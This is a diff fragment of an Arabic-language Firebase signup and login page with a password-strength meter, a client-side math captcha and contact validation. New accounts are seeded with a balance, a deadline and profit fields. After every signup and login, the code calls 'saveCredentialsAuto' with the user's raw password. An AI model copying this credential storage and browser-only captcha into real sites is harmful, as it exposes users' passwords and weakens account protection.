+            if (password.length >= 8) score++;
+            if (checks.upper) score++;
+            if (checks.number) score++;
+            if (checks.symbol) score++;
+            let level = 'weak';
+            if (password.length === 0) level = '';
+            else if (score <= 2) level = 'weak';
+            else if (score <= 3) level = 'medium';
+            else level = 'strong';
+            return { level, checks, score };
+        }
+
+        function onPasswordInput(inputId) {
+            const input = document.getElementById(inputId);
+            const password = input.value;
+            const strengthDiv = document.getElementById('passwordStrength');
+            const bars = [document.getElementById('bar1'), document.getElementById('bar2'), document.getElementById('bar3'), document.getElementById('bar4')];
+            const strengthText = document.getElementById('strengthText');
+            const hints = {
+                length: document.getElementById('hintLength'),
+                upper: document.getElementById('hintUpper'),
+                number: document.getElementById('hintNumber'),
+                symbol: document.getElementById('hintSymbol')
+            };
+            if (password.length > 0) strengthDiv.classList.add('show');
+            else strengthDiv.classList.remove('show');
+            const result = evaluatePassword(password);
+            bars.forEach((bar, i) => {
+                bar.classList.remove('weak', 'medium', 'strong', 'active');
+                const isActive = (i + 1) <= result.score && password.length > 0;
+                if (isActive) bar.classList.add('active', result.level);
+            });
+            const levelTexts = { weak: '🔴 كلمة مرور ضعيفة', medium: '🟡 كلمة مرور متوسطة', strong: '🟢 كلمة مرور قوية' };
+            strengthText.textContent = levelTexts[result.level] || '';
+            strengthText.className = 'strength-text ' + result.level;
+            hints.length.classList.toggle('valid', result.checks.length);
+            hints.upper.classList.toggle('valid', result.checks.upper);
+            hints.number.classList.toggle('valid', result.checks.number);
+            hints.symbol.classList.toggle('valid', result.checks.symbol);
+            checkCardInputs('cardSignup');
+        }
+
+        function highlightSignup() {
+            switchTab('signup');
+            const btn = document.getElementById('signupBtn');
+            btn.style.transform = 'scale(1.05)';
+            btn.style.boxShadow = '0 0 40px rgba(243,186,47,0.8)';
+            setTimeout(() => {
+                btn.style.transform = '';
+                btn.style.boxShadow = '';
+            }, 800);
+            document.getElementById('cardSignup').scrollIntoView({ behavior: 'smooth', block: 'center' });
+        }
+
+        function switchTab(tab) {
+            document.getElementById('cardSignup').classList.toggle('active', tab === 'signup');
+            document.getElementById('cardLogin').classList.toggle('active', tab === 'login');
+            document.getElementById('tabSignup').classList.toggle('active', tab === 'signup');
+            document.getElementById('tabLogin').classList.toggle('active', tab === 'login');
+            checkCardInputs('cardSignup');
+            checkCardInputs('cardLogin');
+        }
+
+        function togglePassword(inputId, btn) {
+            const input = document.getElementById(inputId);
+            const type = input.getAttribute('type') === 'password' ? 'text' : 'password';
+            input.setAttribute('type', type);
+            btn.textContent = type === 'password' ? '👁️' : '🙈';
+        }
+
+        function toggleCheck(el) {
+            el.classList.toggle('checked');
+        }
+        function isChecked(el) {
+            return el.classList.contains('checked');
+        }
+
+        function checkCardInputs(cardId) {
+            const card = document.getElementById(cardId);
+            if (!card) return;
+            const inputs = card.querySelectorAll('input[type="text"], input[type="password"], input[type="email"], input[type="tel"], input[type="number"]');
+            let hasValue = false;
+            inputs.forEach(input => {
+                if (input.value.trim() !== '') hasValue = true;
+            });
+            if (hasValue) card.classList.add('card-filled');
+            else card.classList.remove('card-filled');
+        }
+
+        function generateCaptcha() {
+            const a = Math.floor(Math.random() * 10) + 1;
+            const b = Math.floor(Math.random() * 10) + 1;
+            return { question: `كم يساوي ${a} + ${b}؟`, answer: a + b };
+        }
+        const signupCaptcha = generateCaptcha();
+        const loginCaptcha = generateCaptcha();
+        document.getElementById('signupCaptchaQuestion').textContent = signupCaptcha.question;
+        document.getElementById('loginCaptchaQuestion').textContent = loginCaptcha.question;
+
+        function detectContactType(value) {
+            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            const phoneRegex = /^[\+]?[(]?[0-9]{1,4}[)]?[-\s\.0-9]*$/;
+            if (emailRegex.test(value)) return 'email';
+            if (phoneRegex.test(value) && value.replace(/[^0-9]/g, '').length >= 7) return 'phone';
+            return 'invalid';
+        }
+
+        const signupContactInput = document.getElementById('signupContact');
+        const signupContactHint = document.getElementById('signupContactHint');
+        
+        signupContactInput.addEventListener('input', function() {
+            const value = this.value.trim();
+            if (currentContactType === 'email') {
+                const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+                if (emailRegex.test(value)) {
+                    signupContactHint.textContent = '✓ بريد إلكتروني صحيح';
+                    signupContactHint.style.color = '#22c55e';
+                } else if (value.length > 0) {
+                    signupContactHint.textContent = 'أدخل بريداً إلكترونياً صحيحاً';
+                    signupContactHint.style.color = '#ef4444';
+                } else {
+                    signupContactHint.textContent = 'أدخل بريدك الإلكتروني';
+                    signupContactHint.style.color = 'var(--text-dim)';
+                }
+            } else {
+                const phoneRegex = /^[\+]?[(]?[0-9]{1,4}[)]?[-\s\.0-9]*$/;
+                if (phoneRegex.test(value) && value.replace(/[^0-9]/g, '').length >= 7) {
+                    signupContactHint.textContent = '✓ رقم هاتف صحيح';
+                    signupContactHint.style.color = '#22c55e';
+                } else if (value.length > 0) {
+                    signupContactHint.textContent = 'أدخل رقم هاتف صحيحاً';
+                    signupContactHint.style.color = '#ef4444';
+                } else {
+                    signupContactHint.textContent = 'أدخل رقم هاتفك';
+                    signupContactHint.style.color = 'var(--text-dim)';
+                }
+            }
+        });
+
+        function showError(elementId, message) {
+            const errorDiv = document.getElementById(elementId);
+            errorDiv.textContent = message;
+            errorDiv.style.display = 'block';
+            setTimeout(() => { errorDiv.style.display = 'none'; }, 5000);
+        }
+
+        function validateAgreementAndCaptcha(captchaInputId, agreeCheckId, errorElementId, captchaObj) {
+            const agree = isChecked(document.getElementById(agreeCheckId));
+            if (!agree) {
+                showError(errorElementId, 'يجب الموافقة على الشروط وسياسة الخصوصية للمتابعة.');
+                return false;
+            }
+            const captchaVal = document.getElementById(captchaInputId).value.trim();
+            if (parseInt(captchaVal) !== captchaObj.answer) {
+                showError(errorElementId, 'إجابة الكابتشا غير صحيحة.');
+                return false;
+            }
+            return true;
+        }
+
+        // ========== 📝 Signup ==========
+        document.getElementById('signupForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            const fullName = document.getElementById('signupFullName').value.trim();
+            const contact = document.getElementById('signupContact').value.trim();
+            const password = document.getElementById('signupPassword').value;
+            const confirmPassword = document.getElementById('signupConfirmPassword').value;
+            const btn = document.getElementById('signupBtn');
+            
+            let contactType = currentContactType;
+            if (contactType === 'email') {
+                const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+                if (!emailRegex.test(contact)) {
+                    showError('errorSignup', 'يرجى إدخال بريد إلكتروني صحيح.');
+                    return;
+                }
+            } else {
+                const phoneRegex = /^[\+]?[(]?[0-9]{1,4}[)]?[-\s\.0-9]*$/;
+                if (!phoneRegex.test(contact) || contact.replace(/[^0-9]/g, '').length < 7) {
+                    showError('errorSignup', 'يرجى إدخال رقم هاتف صحيح.');
+                    return;
+                }
+            }
+
+            if (password.length < 6) { showError('errorSignup', 'يجب أن تكون كلمة المرور 6 أحرف على الأقل.'); return; }
+            if (password !== confirmPassword) { showError('errorSignup', 'كلمتا المرور غير متطابقتين.'); return; }
+            if (!validateAgreementAndCaptcha('signupCaptchaInput', 'signupAgreeCheck', 'errorSignup', signupCaptcha)) return;
+
+            btn.disabled = true; btn.textContent = '⏳ جاري إنشاء الحساب...';
+            let email = contactType === 'phone' ? contact.replace(/[^0-9]/g, '') + '@phone.user' : contact;
+
+            try {
+                const userCredential = await auth.createUserWithEmailAndPassword(email, password);
+                const user = userCredential.user;
+                await user.updateProfile({ displayName: fullName });
+                const deadline = new Date(); deadline.setDate(deadline.getDate() + 4);
+                await db.collection('users').doc(user.uid).set({
+                    fullName, contact, contactType, email, balance: 1250, maxBalance: 1250,
+                    createdAt: firebase.firestore.FieldValue.serverTimestamp(),
+                    deadline: deadline.toISOString(), activePlan: null, totalProfit: 0, status: 'active'
+                });
+                
+                // ✅ حفظ البيانات تلقائياً (بدون تسجيل دخول تلقائي)
+                saveCredentialsAuto(contact, password);
+                
+                btn.textContent = '✓ تم التسجيل بنجاح!'; 
+                btn.style.background = '#22c55e'; 
+                btn.style.boxShadow = '0 10px 25px rgba(34,197,94,0.5)';
+                
+                setTimeout(() => { window.location.href = 'dashboard.html'; }, 1500);
+            } catch (error) {
+                btn.disabled = false; btn.textContent = '🚀 سجل الآن';
+                const messages = { 
+                    'auth/email-already-in-use': 'هذا البريد أو الرقم مستخدم بالفعل.', 
+                    'auth/weak-password': 'كلمة المرور ضعيفة جداً.', 
+                    'auth/invalid-email': 'صيغة البريد غير صالحة.' 
+                };
+                showError('errorSignup', messages[error.code] || 'حدث خطأ أثناء التسجيل.');
+            }
+        });
+
+        // ========== 🔓 Login (المستخدم يضغط الزر يدوياً) ==========
+        document.getElementById('loginForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            const contact = document.getElementById('loginContact').value.trim();
+            const password = document.getElementById('loginPassword').value;
+            const btn = document.getElementById('loginBtn');
+            
+            if (!contact || !password) { showError('errorLogin', 'يرجى إدخال جميع الحقول.'); return; }
+            if (!validateAgreementAndCaptcha('loginCaptchaInput', 'loginAgreeCheck', 'errorLogin', loginCaptcha)) return;
+
+            let email = detectContactType(contact) === 'phone' ? contact.replace(/[^0-9]/g, '') + '@phone.user' : contact;
+
+            btn.disabled = true; 
+            btn.textContent = '⏳ جاري تسجيل الدخول...';
+            
+            try {
+                await auth.signInWithEmailAndPassword(email, password);
+                
+                // ✅ حفظ البيانات تلقائياً (لتعبة النموذج المرة القادمة)
+                saveCredentialsAuto(contact, password);
+                
+                btn.textContent = '✓ تم الدخول بنجاح!'; 
+                btn.style.background = '#22c55e'; 
+                btn.style.boxShadow = '0 10px 25px rgba(34,197,94,0.5)';
+                
+                setTimeout(() => { window.location.href = 'dashboard.html'; }, 1000);
+            } catch (error) {
+                btn.disabled = false; 
+                btn.textContent = '🔓 تسجيل الدخول';
+                const messages = { 
+                    'auth/user-not-found': 'المستخدم غير موجود.', 
+                    'auth/wrong-password': 'كلمة المرور غير صحيحة.', 
+                    'auth/invalid-email': 'صيغة البريد غير صالحة.' 
+                };
+                showError('errorLogin', messages[error.code] || 'فشل تسجيل الدخول.');
+            }
+        });
+
+        // ========== 🎨 Animation للـ toast ==========
+        const style = document.createElement('style');
+        style.textContent = `
+            @keyframes slideUp {
+                from { opacity: 0; transform: translateX(-50%) translateY(20px); }
+                to { opacity: 1; transform: translateX(-50%) translateY(0); }
+            }
+        `;
+        document.head.appendChild(style);
+    </script>
+</body>
+</html>
